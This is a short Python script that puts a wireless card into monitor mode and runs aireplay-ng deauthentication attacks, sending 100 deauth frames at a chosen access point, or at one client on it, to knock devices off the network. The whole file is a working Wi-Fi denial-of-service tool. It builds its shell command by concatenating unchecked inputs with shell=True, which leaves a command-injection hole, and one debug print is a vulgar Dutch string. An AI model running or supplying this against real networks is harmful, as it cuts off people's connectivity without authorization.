#!/usr/bin/python

import subprocess
import os
import socket
from monitor_management import *


def kick_ap(AP,CHANNEL,TARGET):
	interface=start_monitor("wlan0",CHANNEL)
	
	if(TARGET!="0"):
		print ("ikbeneenkut")
		command="sudo aireplay-ng -0 100 -a "
		command+=AP
		command+=" -c "
		command+=TARGET
		command+=" "
		command+=interface
		sub= subprocess.Popen(command, shell=True)
		sub.wait()
		stop_monitor(interface)
	else:
		print ("ikwerkkeigoe")
		command="sudo aireplay-ng -0 100 -a "
		command+=AP
		command+=" "
		command+=interface
		sub= subprocess.Popen(command, shell=True)
		sub.wait()
		stop_monitor(interface)
